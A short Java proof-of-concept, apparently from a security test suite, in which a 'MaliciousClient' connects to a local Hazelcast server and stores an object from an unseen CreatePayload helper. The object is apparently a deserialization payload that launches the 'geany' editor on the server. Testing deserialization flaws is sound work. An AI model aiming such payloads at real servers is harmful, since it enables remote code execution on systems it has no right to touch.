package com.hazelcast.test.deserialization;

import com.hazelcast.client.HazelcastClient;
import com.hazelcast.client.config.ClientConfig;
import com.hazelcast.core.HazelcastInstance;
import com.hazelcast.core.IMap;

public class MaliciousClient extends AbstractEnterpriseParent {

  public static void main(String[] args) throws Exception {
    ClientConfig cfg = new ClientConfig();
    cfg.addAddress("127.0.0.1:5701");
    HazelcastInstance client = HazelcastClient.newHazelcastClient(cfg);
    IMap map = client.getMap("customers");
    map.put(1, CreatePayload.createPayload("geany"));
  }
}
